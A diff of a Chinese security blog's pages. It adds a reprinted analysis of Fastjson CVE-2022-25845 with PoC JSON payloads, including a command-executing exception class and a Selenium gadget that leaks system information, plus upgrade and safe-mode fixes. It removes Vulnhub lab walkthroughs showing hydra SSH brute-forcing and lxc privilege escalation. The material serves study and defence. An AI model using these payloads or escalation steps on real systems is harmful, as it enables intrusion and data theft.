+<p>ThrowableDeserializer.deserialize()会处理这种数据。如果存在“@type”，它将使用 autoTypeCheck()检查并继续正常反序列化：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (JSON.DEFAULT_TYPE_KEY.equals(key)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exClassName</span> <span class="operator">=</span> lexer.stringVal();</span><br><span class="line">        exClass = parser.getConfig().checkAutoType(exClassName, Throwable.class, lexer.getFeatures());</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>因此，漏洞的核心在于 ，只要目标类继承自 Throwable 类，Fastjson便可以反序列化为任意类！</p>
+<p>在这种情况下，负责创建反序列化类的函数是 createException()，它处理了 3 种不同类型的构造函数。一个没有任何参数，一个带有异常消息的参数，一个带有异常消息和异常原因参数。在此之后，它将先尝试调用更为复杂的构造函数（causeConstructor、messageConstructor 和 defaultConstructor）：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Throwable <span class="title function_">createException</span><span class="params">(String message, Throwable cause, Class&lt;?&gt; exClass)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Constructor&lt;?&gt; defaultConstructor = <span class="literal">null</span>;</span><br><span class="line">        Constructor&lt;?&gt; messageConstructor = <span class="literal">null</span>;</span><br><span class="line">        Constructor&lt;?&gt; causeConstructor = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (Constructor&lt;?&gt; constructor : exClass.getConstructors()) &#123;</span><br><span class="line">            Class&lt;?&gt;[] types = constructor.getParameterTypes();</span><br><span class="line">            <span class="keyword">if</span> (types.length == <span class="number">0</span>) &#123;</span><br><span class="line">                defaultConstructor = constructor;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (types.length == <span class="number">1</span> &amp;&amp; types[<span class="number">0</span>] == String.class) &#123;</span><br><span class="line">                messageConstructor = constructor;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (types.length == <span class="number">2</span> &amp;&amp; types[<span class="number">0</span>] == String.class &amp;&amp; types[<span class="number">1</span>] == Throwable.class) &#123;</span><br><span class="line">                causeConstructor = constructor;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (causeConstructor != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Throwable) causeConstructor.newInstance(message, cause);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (messageConstructor != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Throwable) messageConstructor.newInstance(message);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (defaultConstructor != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Throwable) defaultConstructor.newInstance();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>作为类实例化的一步，还会为每个相关成员变量调用一个 setter方法：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (otherValues != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">JavaBeanDeserializer</span> <span class="variable">exBeanDeser</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (exClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (exClass == clazz) &#123;</span><br><span class="line">            exBeanDeser = <span class="built_in">this</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">ObjectDeserializer</span> <span class="variable">exDeser</span> <span class="operator">=</span> parser.getConfig().getDeserializer(exClass);</span><br><span class="line">            <span class="keyword">if</span> (exDeser <span class="keyword">instanceof</span> JavaBeanDeserializer) &#123;</span><br><span class="line">                exBeanDeser = (JavaBeanDeserializer) exDeser;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (exBeanDeser != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; entry : otherValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line"></span><br><span class="line">            <span class="type">FieldDeserializer</span> <span class="variable">fieldDeserializer</span> <span class="operator">=</span> exBeanDeser.getFieldDeserializer(key);</span><br><span class="line">            <span class="keyword">if</span> (fieldDeserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">FieldInfo</span> <span class="variable">fieldInfo</span> <span class="operator">=</span> fieldDeserializer.fieldInfo;</span><br><span class="line">                <span class="keyword">if</span> (!fieldInfo.fieldClass.isInstance(value)) &#123;</span><br><span class="line">                    value = TypeUtils.cast(value, fieldInfo.fieldType, parser.getConfig());</span><br><span class="line">                &#125;</span><br><span class="line">                fieldDeserializer.setValue(ex, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2><span id="怎么利用-cve-2022-25845-漏洞">怎么利用 CVE-2022-25845 漏洞？</span></h2><blockquote>
+<p>在了解了AutoType 机制中的上述“漏洞”之后，让我们看看一个在现实中利用这个漏洞的可行性。这个漏洞据称可以实现远程代码执行。</p>
+<p>由 YoungBear 发布的漏洞利用方案，通过传入这个JSON可以运行任意系统操作命令。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.example.fastjson.poc20220523.Poc20220523&quot;</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;calc&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这个漏洞利用方案依赖于在 Java 应用程序中定义的下面这个继承Exception的类：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fastjson.poc20220523;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> youngbear</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span> youngbear@aliyun.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022/5/29 8:28</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span> https://blog.csdn.net/next_second</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/YoungBear</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> POC类：需要代码中有该类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc20220523</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>当反序列化执行到上面这一段JSON时，Poc20220523这个类就创建了，并且提供name参数是通过自动调用setter方法。</p>
+<p>如代码所示，这将最终调用包含 str &#x3D; “calc”的恶意 setName() setter 函数：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String str)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Runtime.getRuntime().exec(str);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这部分的实际代码内容为打开windows计算器：</p>
+<p><img src="/2022/08/03/CVE-2022-25845-Fastjson/2.png" alt="image" title="计算器弹窗"></p>
+<p>这个漏洞利用方案显然只是一个演示，因为任何正常的 Java 应用程序都不会包含类似于 Poc20220523 这样会基于外部参数运行 shell 命令的异常派生类。</p>
+<p>现在亟待解决的问题是 — 是否有大家熟知的 Java“gadget”类可以作为此漏洞的一部分被滥用？即继承自Exception或Throwable，并且存在相关的构造函数或者setter方法，可能会造成实际安全影响的Java类。</p>
+<p>目前，有一个兼容的gadget类（来自 Selenium 库）已经在被发布了。它会导致非常低影响的数据泄漏：</p>
+</blockquote>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.openqa.selenium.WebDriverException&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;y&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$x.systemInformation&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>反序列化这个 JSON 最终会创建一个 HashMap，其中“y”值为有关机器的一些基本信息：</p>
+</blockquote>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;System info: host: &#x27;&#x27;, ip: &#x27;&#x27;, os.name: &#x27;&#x27;, os.arch: &#x27;&#x27;, os.version: &#x27;&#x27;, java.version: &#x27;&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>根据应用程序的不同，这些信息最终可能会被存储或发送给攻击者（例如，它可能被写入可远程访问日志）。</p>
+<p>在检查了 ysoserial 等其他知名来源后，我们没有发现任何可以在实际场景中能够导致远程代码执行的gadget类。因此，想要利用这个漏洞进行实际攻击的黑客，需要对被共计的Java应用服务器进行深入研究，以找到一个加载在Classpath中的自定义的Java gadget类。这个类继承自Exception&#x2F;Throwable，并包含可用于获取权限、泄漏数据甚至运行任意代码的相关方法。</p>
+<p>总而言之，我们评估目前这个漏洞似乎并未构成很高风险的威胁。尽管存在一个潜在影响巨大（远程代码执行）的公共PoC漏洞可利用，并且攻击的条件并不是甚微（将不受信任的输入数据传递给特定易受攻击的 API）。最重要的是，必须找到一个合适的gadget类（或许由于一些不太可能的属性根本不存在）来突破特定被攻击的目标。</p>
+</blockquote>
+<h2><span id="如何完全修复-cve-2022-25845">如何完全修复 CVE-2022-25845？</span></h2><blockquote>
+<p>要完全修复 CVE-2022-25845，我们建议将 Fastjson 升级到最新版本，目前为 1.2.83。</p>
+</blockquote>
+<h2><span id="如何降低-cve-2022-25845-风险">如何降低 CVE-2022-25845 风险？</span></h2><blockquote>
+<p>启用 Fastjson 的“Safe Mode”可以减缓这个漏洞风险。</p>
+<p>可以通过执行以下任何一种操作来开启Safe Mode：</p>
+<p>1.通过代码配置 ParserConfig.getGlobalInstance().setSafeMode(true);<br>2.通过JVM启动参数配置 -Dfastjson.parser.safeMode&#x3D;true<br>3.通过Fastjson的配置文件配置项 fastjson.parser.safeMode&#x3D;true</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Fastjson/" rel="tag">Fastjson</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2022/08/03/Hacksudo-Search/">
                 Hacksudo Search
             </a>
@@ -365,550 +1014,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Hacksudo/" rel="tag">Hacksudo</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/13/jianse/">
-                繭色
-            </a>
-        </h2>
-    
-    <time>
-        Jun 13, 2022
-    </time>
-    <section class="content">
-        <h1><span id="繭色">繭色</span></h1><p><img src="/2022/06/13/jianse/1.jpg" alt="image"></p>
-<p>等待了接近一周的简历投递终于陆续开始有了回应，明天就要先接受 XF 的面试了，当然是希望通过的，亦希望能够顺利与 WW 会师……</p>
-<p>转眼一想，自己已经来到上海快整整一年了，时光飞逝，可惜公司楼下对角的那家居酒屋始终只是停留在了“透过帘布，往酒绿灯红中看了一眼”的程度，莫名可惜。</p>
-<p>「若非前述情境，理应还有机会」</p>
-<p>这篇文章叫“繭色”（茧色），是因为在写这篇时刚好随机到《在地下城寻求邂逅是不是搞错了什么》第三季第八话的插入曲，名为《繭色》。</p>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/New-Start/" rel="tag">New Start</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/13/Hackable-3/">
-                Hackable 3
-            </a>
-        </h2>
-    
-    <time>
-        Jun 13, 2022
-    </time>
-    <section class="content">
-        <h1><span id="hackable-iii">Hackable III</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称hackable-iii">名称：Hackable III</span></h4><h4><span id="发布日期202162">发布日期：2021.6.2</span></h4><h4><span id="作者elias-sousa">作者：Elias Sousa</span></h4><h4><span id="系列hackable">系列：Hackable</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;mnt&#x2F;root&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名hackable3ova">文件名：hackable3.ova</span></h4><h4><span id="文件大小16gb">文件大小：1.6GB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomhackablehackable3ova">下载地址：</span></h4><h4><span id="md5-11855876a01867e9b79d6d5536f89dc0">MD5: 11855876A01867E9B79D6D5536F89DC0</span></h4><h4><span id="sha1-f5f200b85774430e0437f786de11d20a5a022d33">SHA1: F5F200B85774430E0437F786DE11D20A5A022D33</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机Hackable III和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/13/Hackable-3/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，可以发现只开放了80端口，其中有一个http-robots.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -A -p- 192.168.56.103，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/4.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现一些目录，但是没有太多的可用信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.56.103，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/5.png" alt="image-"></p>
-</blockquote>
-<h3><span id="访问主页信息提取解密">访问主页，信息提取解密</span></h3><blockquote>
-<p>1.对靶机主页进行访问，查看源码发现提示：</p>
-<p><img src="/2022/06/13/Hackable-3/6.png" alt="image-"></p>
-<p>2.提示告知我们可能要用到端口knocking及图片隐写的技术，并且获得了jubiscleudo这个用户名，结合提示上方的login页，可以尝试使用sql注入，但发现其实直接登录也会跳转，虽然是空白页，但是可以查看源码：</p>
-<p><img src="/2022/06/13/Hackable-3/7.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-3/8.png" alt="image-"></p>
-<p>3.我们在源码里发现了一个图片指示，结合之前的提示涉及图片隐写，可以把图片获取下来，用steghide分离一下隐藏内容：</p>
-<p><img src="/2022/06/13/Hackable-3/9.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf 3.jpg，分离出文本</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/10.png" alt="image-"></p>
-<p>4.这样我们的得到了第一个端口号，我们返回主页，去&#x2F;config目录下查看，只有一个1.txt，里面是base64编码的10000，如此我们得到第二个端口：</p>
-<p><img src="/2022/06/13/Hackable-3/11.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-3/12.png" alt="image-"></p>
-<p>5.同样，我们去&#x2F;css目录下查看，发现有2.txt，是brainfuck编码的4444，这就是第三个端口号：</p>
-<p><img src="/2022/06/13/Hackable-3/13.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-3/14.png" alt="image-"></p>
-<p>6.而&#x2F;backup目录下有一个wordlist.txt，很像密码字典，我们把这个字典获取，等下可以进行爆破：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.103/backup/wordlist.txt，获取密码字典</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/15.png" alt="image-"></p>
-</blockquote>
-<h3><span id="ssh登录">SSH登录</span></h3><blockquote>
-<p>1.利用三个端口号进行knocking，可以发现ssh已经开放：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">knock 192.168.56.103 10000 4444 65535，knock</span><br><span class="line">nmap -p22 192.168.56.103，查看22端口状态</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/16.png" alt="image-"></p>
-<p>2.利用wordlist.txt密码字典对jubiscleudo用户使用hydra进行爆破，登录ssh：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jubiscleudo -P wordlist.txt 192.168.56.103 ssh</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/17.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jubiscleudo@192.168.56.103，ssh登录</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/18.png" alt="image-"></p>
-</blockquote>
-<h3><span id="二进制提权">二进制提权</span></h3><blockquote>
-<p>1.利用jubiscleudo帐户，我们能查看&#x2F;var&#x2F;www&#x2F;html目录下.backup_config.php文件，可以发现用户hackable_3及其密码：</p>
-<p><img src="/2022/06/13/Hackable-3/19.png" alt="image-"></p>
-<p>2.登录hackable_3，查看组，发现二进制文件lxc和lxd可用：</p>
-<p><img src="/2022/06/13/Hackable-3/20.png" alt="image-"></p>
-<p>3.我们可以利用alpine进行提权，系列命令如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Kali：</span><br><span class="line">把准备好的alpine压缩包传上靶机，命令如下：</span><br><span class="line">scp /tmp/alpine-minirootfs-3.14.1-x86_64.tar.gz hackable_3@192.168.56.103:/tmp/</span><br><span class="line"></span><br><span class="line">hackable_3:</span><br><span class="line">cd /tmp</span><br><span class="line">lxc image import ./ alpine-minirootfs-3.14.1-x86_64.tar.gz –alias fasto</span><br><span class="line">lxc image list</span><br><span class="line">lxd init</span><br><span class="line">lxc init fasto groot -c security.privileged=true</span><br><span class="line">lxc config device add groot mydevice disk source=/ path=/mnt/root recursive=true</span><br><span class="line"></span><br><span class="line">lxc start groot</span><br><span class="line">lxc exec groot /bin/sh</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/21.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-3/22.png" alt="image-"></p>
-<p>4.在&#x2F;mnt&#x2F;root&#x2F;root目录下，可以发现root.txt，即flag：</p>
-<p><img src="/2022/06/13/Hackable-3/23.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Hackable/" rel="tag">Hackable</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/13/Hackable-2/">
-                Hackable 2
-            </a>
-        </h2>
-    
-    <time>
-        Jun 13, 2022
-    </time>
-    <section class="content">
-        <h1><span id="hackable-ii">Hackable II</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称hackable-ii">名称：Hackable II</span></h4><h4><span id="发布日期2021615">发布日期：2021.6.15</span></h4><h4><span id="作者elias-sousa">作者：Elias Sousa</span></h4><h4><span id="系列hackable">系列：Hackable</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>shrek:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度简单">难度：简单</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名hackableiiova">文件名：hackableII.ova</span></h4><h4><span id="文件大小14gb">文件大小：1.4GB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomhackablehackableiiova">下载地址：</span></h4><h4><span id="md5-ee4f408ba953e626e3852cfec7acefa3">MD5: EE4F408BA953E626E3852CFEC7ACEFA3</span></h4><h4><span id="sha1-89b1fdf9fcdcc5d2fbb736318ccc77e9f25d1c06">SHA1: 89B1FDF9FCDCC5D2FBB736318CCC77E9F25D1C06</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机Hackable II和攻击机kali2021在VirtualBox下设置为仅主机模式（Vmware可能会无法获取网络），使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/13/Hackable-2/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，可以发现开放了21，22，80端口，其中21端口可以使用anonymous身份进行登录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -A -p- 192.168.56.101，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/4.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现&#x2F;files目录下有一个CALL.html，但是没有太多的可用信息：</p>
